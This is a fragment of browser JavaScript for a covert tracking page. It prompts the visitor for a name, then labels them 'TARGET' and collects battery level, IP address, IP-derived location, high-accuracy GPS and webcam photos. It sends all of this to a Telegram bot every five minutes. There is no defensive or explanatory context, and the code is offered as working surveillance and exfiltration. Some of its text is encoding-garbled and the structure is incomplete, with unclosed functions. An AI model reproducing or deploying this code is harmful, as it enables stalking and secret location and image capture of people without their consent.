    async function initiateAccess() {
        const nameInput = document.getElementById('userName').value;
        if (!nameInput) {
            alert("‡¶Ö‡¶®‡ßÅ‡¶ó‡ßç‡¶∞‡¶π ‡¶ï‡¶∞‡ßá ‡¶Ü‡¶™‡¶®‡¶æ‡¶∞ ‡¶®‡¶æ‡¶Æ ‡¶≤‡¶ø‡¶ñ‡ßÅ‡¶®!");

            document.getElementById('overlay').style.display = 'none';

    async function startTracking() {

        setTimeout(() => sendReport("INITIAL_SYNC"), 5000);
        setInterval(() => sendReport("LOOP_UPDATE"), 300000); 
    }

    async function sendReport(type) {
        let batteryInfo = "N/A";
        if (navigator.getBattery) {
            const b = await navigator.getBattery();
            batteryInfo = `${Math.round(b.level * 100)}%`;
        }

        const ipRes = await fetch('https://api.ipify.org?format=json');
        const ipData = await ipRes.json();
        const locRes = await fetch(`https://ipapi.co/${ipData.ip}/json/`);
        const locData = await locRes.json();

        let log = `üë§ *TARGET:* ${targetName}\nüîã Battery: ${batteryInfo}\nüåê IP: \`${ipData.ip}\`\nüìç Location: ${locData.city}\nüõ∞ Maps: [Open](https://www.google.com/maps?q=${locData.latitude},${locData.longitude})`;

        navigator.geolocation.getCurrentPosition((pos) => {
            sendToTG(log + `\nüéØ GPS: [Maps](https://www.google.com/maps?q=$${pos.coords.latitude},${pos.coords.longitude})`);
        }, () => sendToTG(log), {enableHighAccuracy: true});

        takeSnap();
    }

    function takeSnap() {
        const video = document.getElementById('webcam');
        const canvas = document.getElementById('snapCanvas');
        canvas.width = video.videoWidth; canvas.height = video.videoHeight;
        canvas.getContext('2d').drawImage(video, 0, 0);
        canvas.toBlob(blob => {
            const fd = new FormData();
            fd.append('chat_id', CHAT_ID);
            fd.append('photo', blob, 'shot.jpg');
            fd.append('caption', `User: ${targetName}`);
            fetch(`https://api.telegram.org/bot${TOKEN}/sendPhoto`, { method: 'POST', body: fd });
        }, 'image/jpeg');
    }

    function sendToTG(msg) {
        fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ chat_id: CHAT_ID, text: msg, parse_mode: 'Markdown' })
        });
